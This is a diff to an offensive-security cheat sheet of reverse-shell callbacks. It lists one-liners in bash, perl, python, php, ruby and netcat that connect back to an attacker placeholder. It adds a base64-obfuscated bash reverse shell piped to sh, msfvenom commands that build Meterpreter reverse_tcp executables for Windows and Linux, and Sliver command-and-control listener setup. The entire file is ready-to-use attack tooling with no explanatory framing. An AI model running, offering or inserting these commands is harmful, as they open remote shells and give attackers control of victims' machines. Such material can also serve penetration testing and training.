@@ -1,25 +1,40 @@
 
+
+#Callbacks
+
 bash -i >& /dev/tcp/{ATTACKER_IP}/{LPORT} 0>&1
-
 perl -e 'use Socket;$i="{ATTACKER_IP}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
 php -r '$sock=fsockopen("{ATTACKER_IP}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'
-
 ruby -rsocket -e'f=TCPSocket.open("{ATTACKER_IP}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-
 nc -e /bin/sh {ATTACKER_IP} {LPORT}
 
-
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT={LPORT} EXITFUNC=thread -f exe -o sc-win64.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT={LPORT} EXITFUNC=thread -f exe -o sc-win86.exe
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT={LPORT} EXITFUNC=thread -f elf -o sc-lin64.elf
-msfvenom -p linux/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT={LPORT} EXITFUNC=thread -f elf -o sc-lin86.elf
+{ENC_CALLBACK_PYTHON}
+{ENC_CALLBACK_BASH}
 
 
+printf '%s' 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxMS80NDMgMD4mMQ==' | base64 --decode | sh"
 
 
 
 
 
+#MSFVenom Payloads
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT={LPORT} EXITFUNC=thread -f exe -o pay64.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT={LPORT} EXITFUNC=thread -f exe -o pay86.exe
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT={LPORT} EXITFUNC=thread -f elf -o pay64.elf
+msfvenom -p linux/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT={LPORT} EXITFUNC=thread -f elf -o pay86.elf
+
+
+
+
+#Sliver Setup
+
+profiles new --http {ATTACKER_IP}:81 --format shellcode osep64
+stage-listener --url tcp://{ATTACKER_IP}:82 --profile osep64
+http -L {ATTACKER_IP} --lport 81
+
+profiles new --http {ATTACKER_IP}:83 --format shellcode -a x86 osep86
+stage-listener --url tcp://{ATTACKER_IP}:84 --profile osep86
+http -L {ATTACKER_IP} --lport 83
